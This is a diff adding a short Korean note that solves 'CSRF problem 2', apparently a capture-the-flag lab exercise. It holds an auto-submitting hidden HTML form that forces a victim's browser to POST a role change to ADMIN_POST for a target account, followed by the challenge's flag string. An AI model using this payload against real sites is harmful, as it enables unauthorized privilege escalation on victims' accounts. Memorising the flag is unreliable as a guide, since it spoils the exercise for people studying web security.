@@ -1,0 +1,12 @@
+========================
+
+* CSRF 문제 2번
+
+========================
+
+1. <form id="csrf_form" action="/csrfpost/update_role_ok_post.jsp" method="POST" target="hidden_iframe"><input type="hidden" name="target_id" value="gggg@gggg.com" /> <input type="hidden" name="new_role" value="ADMIN_POST" /> </form> <script> document.getElementById('csrf_form').submit(); </script>
+
+2. EQST{P05T_m3th0d_15_an5w3r}
+
+========================
+
